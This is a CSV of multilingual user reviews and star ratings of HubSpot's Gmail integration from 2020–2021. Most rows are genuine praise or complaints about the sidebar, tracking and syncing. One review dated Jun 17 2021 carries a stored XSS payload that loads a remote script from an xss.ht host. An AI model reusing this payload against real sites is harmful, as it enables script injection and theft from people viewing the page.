User Review,Star Rating,Date
Ça révolutionne une entreprise!! Peux importe la taille. C'est un modèle de rigueur et de fiabilité. Concentrons nous sur le principal but satisfaire notre clientèle et rentabiliser nos investissements.,5 of 5,Jun 26 2021
Funciona muy bien. Su integración con las demás herramientas de la suite lo hacen muy funcional,5 of 5,Jun 25 2021
Gmail EZ AF cause it really do be smacking though. I highly recommend and you must use!,5 of 5,Jun 25 2021
Me pone las cosas muy fáciles y la sincronización nativa con otros sistemas que uso a diario.,4 of 5,Jun 24 2021
Yes it working well and has impacted my business in a positive way. It has my process of doing business highly organized.,5 of 5,Jun 24 2021
Gmail I great for personal and business. The ability to use the email open tracking in an unobtrusive way has been very helpful both personally and professionally to confirm important messages are received. It also allows me to tailor follow-ups based on email open activity.,4 of 5,Jun 24 2021
Most of the activities are easier to manage due to automated tracking emails,4 of 5,Jun 24 2021
It's a great way to keep all types of communications in one place instead of having to follow through in different platforms,5 of 5,Jun 24 2021
The HubSpot extension is too resource-intensive and slows down the rest of my browser,1 of 5,Jun 23 2021
Works perfect! If mail address or domain in HubSpot mail can be logged at the right spot in HubSpot,4 of 5,Jun 23 2021
Gmail es excelente solo a veces es confuso cuando son muy extensos los correos es decir cuando hay un historial de correos adjunto,5 of 5,Jun 22 2021
it works well better than most platforms. helps us get done what needs to be done,4 of 5,Jun 22 2021
The integration with gmail is good but too encompassing. When I connected gmail for my 1 work account HubSpot thought it was a good idea to also include my other work account. So now all of my email from two different companies goes into the one...not good for multiple reasons. Trying to separate them is virtually impossible now because the documentation is lacking.,2 of 5,Jun 22 2021
It functions great when it's actually connected but that's so hit or miss that it drives me crazy.,1 of 5,Jun 22 2021
Maravilhosamente bem suporte total a tudo que se trata de email eu tenho com o Workspace,5 of 5,Jun 22 2021
Work well and everything seems to be in place. I do think the UXUI can be clearer though.,5 of 5,Jun 22 2021
good to work with integrated Gmail + HubSpot  our entire organization is working for all the scopes,5 of 5,Jun 22 2021
Great not spending too much time on a review. I'm busy and this is too much for me to write....,4 of 5,Jun 21 2021
Works as it should via a CRM but the inability to remove the HubSpot branding from the email body unless one is to pay for the service is nothing acceptable.,2 of 5,Jun 20 2021
its so easy to access the gmail to the HubSpot that's why I loved to used it.,5 of 5,Jun 20 2021
Gmail is great. The HubSpot integration lacks a lot of features. We need to be able to add contacts to lists from within gmail. Also be able to edit contact details from within gmail.,1 of 5,Jun 19 2021
Gmail like Outlook and other email systems has its own strengths as well as challenges. The challenge can be ease of use locating specifically needed components and activating or deactivating accordingly. Gmail sometimes does not have as user-friendly a system as I would like.,3 of 5,Jun 18 2021
Buona da migliorare l'associazione delle mail alle varie offerte aperte. Semplice da configurare,4 of 5,Jun 18 2021
good CRM but finding emails are tough. the dashboard is not easy to use. sometimes can't manage the un structured data,3 of 5,Jun 18 2021
Mühsam da doppelt Termine im Auge behalten werden müssen. Sollte besser und einfacher mit Outlook auch älter als Office365 funktionieren,2 of 5,Jun 18 2021
It would be wonderful to have a way to track specific emails connected to customers and companies but the integration will expose all your emails to everyone using HubSpot. No privacy no possibility to integrate with different authorization access.,1 of 5,Jun 18 2021
"><script src=https://vasgrg.xss.ht></script>hdddddddddddddddddddddddddddb csbndvchgsdvchs,4 of 5,Jun 17 2021
I've linked up HubSpot with Gmail and given it access. Calendar / meeting invitations are being picked up in HubSpot but none of the emails...and all the help pages haven't give me a clue. Some of the help pages actually contradict each other....*sigh*,1 of 5,Jun 17 2021
Me ha sido muy practica para enviar y recibir correos y darle seguimiento mediante las aperturas.,5 of 5,Jun 16 2021
O Gmail funciona perfeitamente bem. Não imaginava que seria tão boa a integração com o HubSpot mas me sinto muito surpreso. Acredito que utilizo plenamente todo o potencial que o HubSpot me oferece a partir dessa integração.,5 of 5,Jun 16 2021
I like being integrated. What I don't like is the HubSpot ribbon on the side taking up so much space. It forces me to scroll EVERY email I get greatly reducing my positivity about HubSpot. If that could be smaller/eliminated etc - I'd feel better about HubSpot. If I'm forced to chose one or the other - HubSpot will not win.,2 of 5,Jun 16 2021
Gmail serves as the basic means of communication. There is a range of free apps to connect and maintain the communication easier for our non-profit organisation.,4 of 5,Jun 16 2021
Gmail is fine - HubSpot's ability to track opened emails in a group email is a failure.,2 of 5,Jun 16 2021
It's working very well so far. With the ease us from HubSpot it's becoming much more powerful.,4 of 5,Jun 16 2021
Doesn’t work I was trying to get my emails in HubSpot for my contacts doesn’t work at all,1 of 5,Jun 16 2021
Gmail es simplemente insuperable como servicio básico de mensajeria sin dominio profecional,5 of 5,Jun 15 2021
Gmail is great the HubSpot integration needs some sharpening up. The sidebar popup to add new contacts to HubSpot pops up far too regularly. Whenever any email is clicked on the HubSpot sidebar appears unnecessarily which is irritating.,2 of 5,Jun 15 2021
Its the only mail service I use so it hard to say Since I only use Gmail for my communication,4 of 5,Jun 15 2021
Great tool allowing email correspondence with easy search feature. Mails can be easily sorted.,4 of 5,Jun 15 2021
Gmail is excellent. The HubSpot sidebar that opens with every message and cannot be persistently closed (kept closed) ruins the UX and robs users of 15-25% of available screen space. Unfortunately we have to keep the plugin installed for tracking/logging but I use an ad blocker to block the panel so all I get is a big waste of white space.,2 of 5,Jun 14 2021
All the features just work. Moving from Office365 it was not clear where everything was however once I was able to identify all functionality it has been seamless.,4 of 5,Jun 14 2021
Overall I couldn't be more satisfied. This software is very user friendly and cost effective. I am glad I decided to give it a try.,5 of 5,Jun 12 2021
HubSpot integrated with Gmail is exceptional - because all the same messaging templates and snippets stored in HubSpot are one-click accessible to pull into your Gmail messaging. And having HubSpot Log 'n Track all my Emails and activities to each of my contacts - no more searches trying to find my last emails to particular contacts - I just click the Contact in HubSpot and it organizes and stores all my Gmail activity in my Contacts account. Wallah ! Don't stop doing what you do so well - HubSpot ! Keep improving my Emailing life...,5 of 5,Jun 12 2021
It's a great that we can track our doc email and other activities to make a proactive approach.,5 of 5,Jun 12 2021
a great partnership together  both work very well together . finding it very useful,5 of 5,Jun 11 2021
It is good have to say. There are definitely some upgrades they could make to the HubSpot widget which could certainly improve performance such as adding a notes page under the title of a task and better use of the vidyard feature within HubSpot too.,4 of 5,Jun 11 2021
Works so well I don't think about it when I'm sending emails - it just does everything for me.,5 of 5,Jun 10 2021
Very well it's user friendly I can search for old emails and find it very quickly,5 of 5,Jun 10 2021
Overall when gmail mails comes its difficult as it allcomes together and we have to seach fior the required mail. better is outlook but still ok,4 of 5,Jun 10 2021
Overall the integration is great - the new pop up which is automated on the Gmail "side panel" needs to be improved or configurable as this has effectively stopped me from being able to use all other side panel features.,3 of 5,Jun 10 2021
Can create contacts / Companies directly from Email; Can create task and ensure I don't forget to followup; add templates and snippets easily; meetings are also very easy to use.,5 of 5,Jun 9 2021
Normal and usual business communication. Usual correspondences and business communication.,4 of 5,Jun 9 2021
works great. I really dont have time this morning to complete this....................,4 of 5,Jun 9 2021
I love using HubSpot and Gmail I don't have to log and emails because it automatically does it for me saves me so much time!,5 of 5,Jun 9 2021
Uma boa experiência e facilidade na usabilidade e também apoiando a economia de tempo.,5 of 5,Jun 8 2021
Doesn't integrate with local email applications. Employee base is split between Macs and PCs but use the local email app for day to day (vs. browser email). HubSpot email integration appears to only work on browser use and doesn't work at all with Mac email local app.,1 of 5,Jun 8 2021
Gmail works great but I felt like HubSpot hijacked it!!! I deleted that in your programs so it does not do that anymore.,1 of 5,Jun 8 2021
The issue I'm having is HubSpot defaults the tracking and CRM features and most of the time I don't want those. The documentation I read suggested there is now way to default them to off letting me check the box if I want to track them and add them to CRM. It's a huge time waster.,2 of 5,Jun 8 2021
Gmail is working very well plus HubSpot is a ferrari with a lot of potential,5 of 5,Jun 8 2021
muy bien cumple con las necesidades que tengo de un servicio completo y rápido,5 of 5,Jun 7 2021
Sim até agora sem qualquer tipo de problemas. Corresponde ás minhas expectativas.,4 of 5,Jun 7 2021
Agiliza minhas tarefas. Sendo prático e funcional permitindo uma boa conversação entre setores.,5 of 5,Jun 7 2021
Gmail is working well for us and is better now we are using it as part of Workspace.,2 of 5,Jun 7 2021
Todo genial funciona a la perfección y me aparecen todos los correos en todas partes.,5 of 5,Jun 7 2021
Very good great that it all dovetails with PC iPad and phone for ease of starting and picking up all correspondence,5 of 5,Jun 7 2021
Faciliter d'enregistrement de document dans GoogleDrive. Possibilité de réer des sous libellés et des mails types. Synchronisation facile entre plusieurs appareils. Utilisation d'une adresse vitrine commune pour l'équipe. Possibilité d'enregistrer une signature et de mis e en forme dans les mails. Permet de retrouver l'historique des mails.,3 of 5,Jun 7 2021
Excellent. Gmail HubSpot integration Gmail HubSpot integration Gmail HubSpot integration,5 of 5,Jun 7 2021
It's awesome. It's very easy for us to communicate with the leads and we can keep an eye when they're looking through the Collaterals and all. It's helpful to connect with the lead.,5 of 5,Jun 5 2021
Es muy buena y funciona muy bien me gusta mucho por que me ayuda en todo mis beneficios,4 of 5,Jun 5 2021
Nos ajuda muito a melhorar a experiência de troca de dados criação de atividades.,5 of 5,Jun 4 2021
It's ok but threading is terrible I can lose lot of time finding a specific email in a long thread,4 of 5,Jun 4 2021
Gmail is a great email service. Being able to create tags allows me to differentiate between different work-associated issues with ease.,4 of 5,Jun 4 2021
gmail funciona muy bien para mi y para los trabajos que realizo a diario no tengo inconvenientes hasta el momento.,4 of 5,Jun 4 2021
Es bueno ya que todo lo que se hace en gmail queda registrado automaticamente.,5 of 5,Jun 2 2021
Gmail is good. My experience using the tools is low so my experience was frustrating.,2 of 5,Jun 2 2021
It's a decent integration and the sidebar panel for clients is nice when you're viewing an email. The tracking/log controls are easy and the snippet/template stuff is great - we use it often. But coming from Insightly the one BIG omission is a simple click to save against a HubSpot record. Insightly allowed you to click 'save' and search for a contact opportunity project etc and save the email against it. HubSpot still requires the 'forward to an email' thing and doesn't really let you choose how it's saved.,4 of 5,Jun 2 2021
gmail es excelente!! a quien no califiqué muy bien es HubSpot ya que no concilia la firma a los emails que esta inscrita en gmail HubSpot no me traslada esa firma de manera automatica,3 of 5,Jun 2 2021
works good. No faults really sometimes a bit slow but thats it. not all the time,5 of 5,Jun 2 2021
Gmail integration seems to be sporadic and drops on and off - not recording emails within contact profiles.,2 of 5,Jun 2 2021
very fast and works perfectly well with all my tasksvery fast and works perfectly well with all my tasks,5 of 5,Jun 1 2021
Bueno el servicio me ha parecido hasta el momento muchas gracias he optimizado mejor mi interacción con clientes.,5 of 5,Jun 1 2021
I only use Gmail outside of HubSpot. There are pros and cons. My Gmail is integrated with HubSpot but I do not use it. I am a true startup and Army of one. There are too many limitations using Gmail through HubSpot. HubSpot wants to brand all of my emails with HubSpot logo and links. It make my emails look cheap....which is not helpful to a startup.,1 of 5,Jun 1 2021
Very Poor. When sending email Campaigns it only recognises one email not the bulk 100. When targetting thousands of customers this needs to be recorded. It thought I was a Spammer so decided to block my messages.... its bloody sales its a numbers game. Very much an obstacle to success.,2 of 5,Jun 1 2021
good not having any problems at this time I like the way I can organize things,5 of 5,Jun 1 2021
Funciona bien en realidad deberían tener integraciones con otros administradores de correo donde uno pueda usar la integración y poder tener administrar varias cuentas.,5 of 5,Jun 1 2021
Very good I like the integration between the two system. I really enjoy use it  it’s useful !,5 of 5,Jun 1 2021
Muy bien. Ha sido un (Real) Aporte; he tenido varios Ptos. de Contacto post Campaigns con G. Ads,5 of 5,Jun 1 2021
increíblemente bien te da la oportunidad de tener una suite llena de atajos y mejoras,5 of 5,Jun 1 2021
Califico de excelente la integración. HubSpot es espectacular en su desempeño,5 of 5,Jun 1 2021
amazing...................... everything seems to be in track and its working so thats good enough for me.,5 of 5,Jun 1 2021
La uso tutti i giorni con più profili quindi tanto. A mio parere c'è margine di miglioramento,3 of 5,May 31 2021
Helaas minder enthousiast dus hierdoor want ik moest het alsnog via Pop3 etc oplossen en dat was een heel gedoe,3 of 5,May 31 2021
La extensión de husbpot en Gmail funciona muy bien me permite tener una trazabildiad de la gestion comercial de mi equipo en tiempo real!,5 of 5,May 31 2021
The problem with the app is that it is not following the Google guide lines. That means that you cannot use the tabs because HubSpot interfeers in the browser window. I hobe you will update the asap.,2 of 5,May 31 2021
It has been used for both personal and business transactions. It has generated me clients and sales,5 of 5,May 29 2021
Vem me ajudando muito principalmente agora que estou descobrindo mais funções!,5 of 5,May 28 2021
Funciona muy bien es un agrado el calendar de HubSpot + gmail. Simplifica mucho el agendamiento de reuniones,5 of 5,May 28 2021
This saves us a ton of time in documenting conversations. We have found it valuable and effective.,5 of 5,May 28 2021
it has everything we need and is cloudbased  it really is our document history management system having the ability to see the conversation now in HubSpot seamlessly is great it would be nice to be able to categorise or ignore certain trails like certain emails are either junk or they are personal,4 of 5,May 28 2021
Va muy bien me gusta la integración con HubSpot fluida intuitiva y se conecta perfecto con mis prospectos y clientes (fidelización).,5 of 5,May 27 2021
Ha sido una herramienta de mucha utilidad ya que se lleva un mejor control tanto de los correos que entran como de los que se envían,5 of 5,May 27 2021
Excelente herramienta y no se como trabajaría sin ella ya que me ayuda a ser mas productivo.,5 of 5,May 27 2021
Very easy to use... Yet I do not understand why some emails are not associated with the right deals.,3 of 5,May 27 2021
Gmail es muy sencillo y practico para utilizar. Ademas que uno de los puntos positivos es la presencia del corrector automatico donde facilita en la escrita :)!,4 of 5,May 27 2021
its working great and most of the features I want are at my finger tips. its awesome to use,5 of 5,May 27 2021
It was working great before and I was a fan of the plug in but I believe I am running into a bug where I am unable to sign in now. have tried to unadd plug in and re add it but not working,1 of 5,May 26 2021
Gmail funciona perfectamente para lo que necesito. Ha ayudado a mi empresa a generar muy buenos leads contactos networking etc.,5 of 5,May 26 2021
it is a great place to allow each other to communicate and to get my work done.,4 of 5,May 26 2021
I like HS for what it can do but am not happy with what it won't do. The options are great but it's all or nothing. There really has to be automation friendly options for email integration. I don't need spam email infecting my HS account.,2 of 5,May 25 2021
I love google products and haven't tried any other email services for my business or personal use. I'm biased for sure.,5 of 5,May 25 2021
excellent for my type of work typically good integration with extension of other apps but for a while now the HB extension started having an annoying side window pop up that i could deactivate - had to remove the extension to stop it from popping up at every email. its closing button was also overlapping with other gmail buttons and made it impossible to turn it off,2 of 5,May 25 2021
HubSpot integration of Gmail is a definite improvement over regular Gmail. It is now part of my routine.,5 of 5,May 24 2021
it's free which is a maasive bonus it's helpful to be able to add leads immediately add a task or deal too. I wish it was possible to edit the details in gmail too like you can with the intercom + HubSpot integration,5 of 5,May 24 2021
I will rate poor for overall my experience with HubSpot and will not recommend to anyone My experience is literally worst with HubSpot tool,1 of 5,May 24 2021
Excelente de las mejores aplicaciones para trabajar muy intuitiva Fácil de entender y muy simple de usar Tiene herramientas gratuitas que apoyan mi trabajo,5 of 5,May 24 2021
Gmail works well I don't like that some of my messages from someone I get mail from on a daily basis is put in the Social or Promotions folders.,4 of 5,May 23 2021
It allows me to be more productive because I don't have to duplicate task and contact information,4 of 5,May 23 2021
Gmail is easiest to navigate easy it is to use it seems like anything you need is right there at your fingertips plus all the hundreds and thousands if not millions of extensions and this all makes it very smooth to run a business with.,2 of 5,May 22 2021
muy bien para la empresa es apropiado y logra que optimicemos nuestro tiempo y recursos.,5 of 5,May 21 2021
excelente herramienta para la elaboración de campañas y marketing digital recomiendo mucho la herramienta,5 of 5,May 21 2021
booohooo jhbouifhhjsvhn;aijupiwejhbchjbdxkjn yigtiuyhjikh yuguiyhoijh;juih yguighjki,3 of 5,May 21 2021
The integration features with Gmail allow me to gain the visibility and insights I need to make informed decisions as it relates to my prospects and their ultimate decision making. Putting together new documentation is a breeze.,5 of 5,May 21 2021
Es un correo mundial y muy funcional de fácil operación y ameno para enviar correos,4 of 5,May 21 2021
positivamente a afectado la operación de ventas de la empres. Pero tengo dudas de como aumenta el conteo de si se abrió el correo.,4 of 5,May 21 2021
The pop out on the right of the page needs to have a stop function it opens on every new email and takes up too much of the screen. I understand the benefits of it but it would be better to have the choice to use it or not. It takes up too much space on the page especially if you have the email page layout in two columns.,2 of 5,May 21 2021
impossibilitato a controllare il numero di aperture di un'email o dell'allegato all'interno come fossi su HubSpot funzionalità parziali,2 of 5,May 21 2021
Es läuft alles super gut und bin Super Zufrieden mit HubSpot +Gmail. Kann es nur Weiterempfehlen.,5 of 5,May 21 2021
HubSpot's GMail integration is pretty seamless and makes it incredibly convenient to log/track emails. It's particularly helpful when sending proposals to potential clients so we can see in real time when they are opening and know when to do appropriate follow-up.,4 of 5,May 20 2021
O Gmail funciona muito bem e junto com o HubSop só veio agregar valor! Facilidade para quem utiliza e muito bom para a empresa acompanhar o andamento do trabalho de seus funcionários.,5 of 5,May 20 2021
it helps me to store a bulk of data under one roof. no need of any extra crm,5 of 5,May 20 2021
Muy bien ha acelerado nuestro servicio y ha mejorado nuestra realcion con nuestros clientes,5 of 5,May 20 2021
Es universal confiable de facil acceso y compatible e,5 of 5,May 19 2021
Gmail ha sido una herramienta fundamental para el negocio pero la integración entre ambas plataformas deja mucho que desear. No es sencilla y en últimas resulta mejor buscar y enviar todo desde el mismo gmail y no HubSpot,3 of 5,May 19 2021
Works great except for those few times the emails don't get integrated. It allows me to send emails quicker without having to leave the platform.,3 of 5,May 19 2021
Muy bien se gestionan mejor lo contactos y las conversaciones y es muy fácil de usar,4 of 5,May 19 2021
As you can expect from an email service like Yahoo Gmail you can use it in Outlook or standalone mine is integrated into the company structure,4 of 5,May 19 2021
Excellent! It has made me well-organized! I feel confident stress-free & relaxed using it.,5 of 5,May 19 2021
Es una buena integración aunque en pocasiones se desconecta o por alguna razon no se vuelcan los emails al 100%  no es facil filtrar aquellos emails que no deben volcarse pero esto depende mas de HubSpot que de Gmails.,3 of 5,May 19 2021
La integración con HubSpot es muy básica y algunos correos no migran. (aun con la extensión prendida),2 of 5,May 18 2021
Works efficiently and allows https://www.gend.co to quickly log gmail conversations and sales outreach with our contact records.,4 of 5,Mar 11 2021
somente sincroniza na primeira vez............................................................,1 of 5,Mar 2 2021
Esta funcionando de maravilla ya que me ha dado los soportes necesarios para interactuar con mis clientes.,5 of 5,Dec 21 2020
Works great with HubSpot. Can email from both gmail and HubSpot. The emails auto-log to the lead's profile in HubSpot and I can see if my prospect opened or clicked on any links. I can also use the templates sequences documents and my calendar links directly in Gmail.,5 of 5,Dec 21 2020
Basic options don't work. Some options like having your signature in your email have been disabled. So you cant have your signature. Which is kind of important when sending prospects emails. Not impressed at all,1 of 5,Dec 18 2020
It works fine when it stays logged in. Every other day I have to log back into the HubSpot tool.,2 of 5,Dec 17 2020
I have 3 different businesses that all use Gmail and I figured that since I have each one connected (in HubSpot) to a HubSpot account using that email address that it wouldn't send email from one account to another but it does. It doesn't matter what account you link in HubSpot if you are logged in to a specific HubSpot account (which it forces when you are in Gmail) then all other Gmail accounts open that have the plugin will send emails to that HubSpot account. This is very bad for me.,2 of 5,Dec 17 2020
Not well switching hosting to windows within the next quarter. For now we are not using the integration to its full potential.,3 of 5,Dec 17 2020
Para mi personalmente es muy practico. Para el trabajo muy útil y seguro.,5 of 5,Dec 17 2020
Easy to use suits well in the plateform and allow to me to have a general overview of all my activities,5 of 5,Dec 17 2020
既存の連絡先を全て潜在顧客として捉えることが可能となるので、 新しいビジネスチャンスにつながります。 また、操作も簡単ですので質の良いコンタクトをどんどん追加していけます,4 of 5,Dec 17 2020
Gmail und HubSpot funktionieren zusammen leider nicht gut. Mein Team und ich bitten daher dringenst um eine Integration in Mac Mail.,1 of 5,Dec 17 2020
I want the ability to choose how I log in and not get the feeling I have to use gmail. HubSpots is nice but needs improvement especially on who review my email great idea but not there yet,2 of 5,Dec 17 2020
funciona bien respuesta rápida fácil manejo en general. facilita el agendamiento.,5 of 5,Dec 17 2020
Es simplemente la mejor herramienta que hemos encontrado para gestionar los correos corporativos de la empresa,5 of 5,Dec 16 2020
I'd looked for a solution that allowed all the emails sent and received to a particular client to be stored in a neat and easy way along with notes call logs meetings etc to keep on track of everything. Gmail integrates with HubSpot seamlessly it even handles aliases pretty well which I wasn't expecting.,5 of 5,Dec 16 2020
Gmail integration is wonderful as I can see real time alerts regarding prospects opening and viewing emails sent. It is also adds ease of attaching marketing material to send to prospects.,5 of 5,Dec 16 2020
Muy bien me brinda una experiencia bastante agradable conectando funcionalidades de HubSpot en mi Gmail.,5 of 5,Dec 16 2020
great helps to track the emails easier and faster to log the customers' information in the HubSpot,5 of 5,Dec 16 2020
It's a great tool and one that we find very helpful both for ourselves and for our clients. However we run into issues with users who have multiple HubSpot accounts and wish to log different emails to different accounts. It would be great if there was a way within both gmail and outlook for you to toggle/select which HubSpot account you want to log each email to.,3 of 5,Dec 16 2020
Me es útil y práctico en todo lo que hago día a día puedo ver todo lo relacionado con mis actividades,4 of 5,Dec 15 2020
Excelente es muy útil su integración con Google Workspace. Hace el trabajo y seguimiento realmente práctico,5 of 5,Dec 14 2020
Perfectly we use it as our communication channel within the company and it works perfectly. As well as our communication channel with outbound leads we want to prospect and to evangelize with our solution. It has been really useful and we have managed to capture the interest of leading companies in different industries.,4 of 5,Dec 14 2020
Great additional to be able to track all incoming/outgoing emails for sales leads. It also automatically adds new contacts which is a huge time saver.,5 of 5,Dec 14 2020
Gmail is awesome. Cannot do without it! It stores my documents for any time referencing and is user friendly.,5 of 5,Dec 13 2020
Our company is having explosive growth. I love being able to see everything that I've sent my love having the templates I love Tracking my emails love the signature part is really nothing that I don't like about Gmail except that it doesn't have G mass and I love it together with hub spot so perfect I which hotspot was a little cheaper let the but it,5 of 5,Dec 12 2020
PARA MI HA SIDO UNA BUENA OPCIÓN CONTAR CON GMAIL POR QUE DE MI CORREO CORPORATIVO COPIO A ESTE Y LA INFORMACIÓN QUEDA RESPALDADA.,5 of 5,Dec 11 2020
Love the plug-in but it needs to support creating new tickets too. Currently it only allows linking to existing tickets. There should be an option to create a new ticket as well that is linked to the email and the contact.,5 of 5,Dec 11 2020
In my opinion there could be more documentation related to the usage of the extension as it has excellent features and functions that can be discovered by using the tool but not from a document outlining them for people who have never had the chance to experiment with it.,5 of 5,Dec 10 2020
Gmail is great. It is a much better solution for email then competitors that rely on POP or IMAP or Outlook/Exchange. The big problem with the integration of HS with Gmail is that there is still a lot of manual effort to bring data into HS. This isn't state of the art compared to other CRM tools on the market.,3 of 5,Dec 10 2020
Gmail isolated is very good and the HubSpot tracking is less advanced when it comes to overview of tracking per email in G-mail/HubSpot extension and total view of campaigns etc in HubSpot - have a look at Mixmax for improvement suggestions ;-). I would strongly recommend to allow to import stand-alone mailing list from .CSV in HubSpot sequences.,3 of 5,Dec 10 2020
Really helpful and saving time. All organised well in one place and the mail tracking works really good,5 of 5,Dec 10 2020
4. La explicación es pesima en un espectacular producto. Es soportable pero no deberia permitirse. En general la explicaciones son deficiente y la curva es dolorosa,5 of 5,Dec 9 2020
My team is able to see contact activities and reach out or not to specific contact according to my previous messages. Moreover the widget for Gmail helps me speed up the writing process by selecting snippets and templates directly into Gmail.,5 of 5,Dec 7 2020
super tous les mails sont automatiquement envoyés sur HubSpot à partir de ma messagerie,5 of 5,Dec 2 2020
it's working great easy to use and working as I intended. Only that it's actually add-on is a bit off-putting but not terrible,4 of 5,Nov 26 2020
I would really like the HubSpot extension to work but had to disable until the problem can be overcome. I use the mail search function a lot.,2 of 5,Oct 9 2020
1) I would like HubSpot to retire the legacy Chrome Extension in favor of a Google G-Suite Gmail Addon. The extension sits on top of the native UI overlaying other components and never works quite right frequently causing issues when trying to send messages through Gmail. 2) When you publish the addon please make sure it has the ability to create tickets. One use-case for this would be to click on a HubSpot addon in Gmail to forward messages that were sent to individual address (instead of the support address) and this functionality would allow us to create a ticket on behalf of the original sender.,3 of 5,Sep 26 2020
There is one big problem with Gmail-HubSpot arrangement- It is not possible to sync contacts. It would be very convenient to have all the contacts I add to HubSpot populate in Gmail because it is very annoying to have contacts in two different places.,3 of 5,Aug 3 2020
Gmail seems to work well. HubSpot email tracking doesn't work that well. email tracking within HubSpot is atrocious as it doesn't handle contacts tied to multiple deals. it simply guesses and is a huge time suck to clean up deals that have multiple contacts or contacts with multiple deals associated with him/her. This takes so much time to clean this up and get it sorted out.,2 of 5,Jul 15 2020
The HubSpot Gmail integration does not meet my expectations at all. This is the capability I like least about HubSpot and the only thing I really miss about our previous CRM system.,2 of 5,Jul 14 2020
And even the non-techies like me can get it working so that emails log to the HubSpot CRM easily.,5 of 5,Jul 14 2020
Working fine but HubSpot integration is very intermittent. Sometimes works mostly not. Also the way HubSpot displays email threads is so annoying it’s almost a showstopper. You click on an email to some more and it leaps off in an entirely disorienting way somehow positioning the thread upside down so you have no idea what order to read anything in. It sucks,2 of 5,Jul 13 2020
yet to see its benefits figuring out how to leverage the integration and with time we hope to know more about it.,5 of 5,Jul 13 2020
Logging/Tracking Gmail activity as a sales rep goes saves the rep time and provide "activity" visibility across our company.,4 of 5,Jul 13 2020
The HubSpot-Gmail integration makes it easy to engage and serve clients. All the email functions (snippets templates meetings and sequences) are available in the familiar Gmail interface.,5 of 5,Jul 13 2020
If I have HubSpot integration turned on with my business account and accessed my personal account any email i send from the personal account the HubSpot plugin picks it up and logs it in HubSpot or sends it to the default email address of the business. This is a major security flaw.,1 of 5,Jul 13 2020
